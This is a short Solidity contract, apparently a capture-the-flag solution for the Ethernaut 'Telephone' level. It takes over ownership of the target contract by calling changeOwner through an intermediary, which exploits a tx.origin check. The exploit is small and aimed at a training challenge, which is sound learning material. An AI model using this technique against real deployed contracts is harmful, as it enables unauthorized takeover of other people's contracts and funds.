// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import {Telephone} from "./Telephone.sol";

contract TelephoneHackDan {

    Telephone telephoneContract;
    constructor(address _levelAddress) {
        require(_levelAddress != address(0), "Zero Address");
        telephoneContract = Telephone(_levelAddress);
    }

    function hackTelephone() external {
        telephoneContract.changeOwner(msg.sender);
    }
}